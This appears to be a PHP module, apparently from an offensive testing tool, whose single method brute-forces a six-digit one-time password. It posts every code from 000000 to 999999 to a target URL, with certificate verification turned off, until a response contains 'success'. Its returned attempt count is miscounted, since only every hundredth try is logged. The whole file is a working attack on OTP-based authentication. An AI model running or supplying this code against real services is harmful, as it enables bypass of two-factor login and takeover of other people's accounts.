<?php
class IntruderHandler {
    public static function otpBruteforce($params) {
        $url = $params['url'];
        $otpField = $params['otp_field'] ?? 'otp';
        $results = [];
        $found = null;

        for ($otp = 0; $otp <= 999999; $otp++) {
            $payload = str_pad($otp, 6, '0', STR_PAD_LEFT);
            $post = [$otpField => $payload];
            
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($post));
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            
            $resp = curl_exec($ch);
            $http = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            curl_close($ch);
            
            if ($http == 200 && strpos($resp, 'success') !== false) {
                $found = $payload;
                break;
            }
            
            if ($otp % 100 == 0) {
                $results[] = ['otp' => $payload, 'status' => $http];
            }
        }
        
        return ['found' => $found, 'attempts' => count($results)];
    }
}
?>
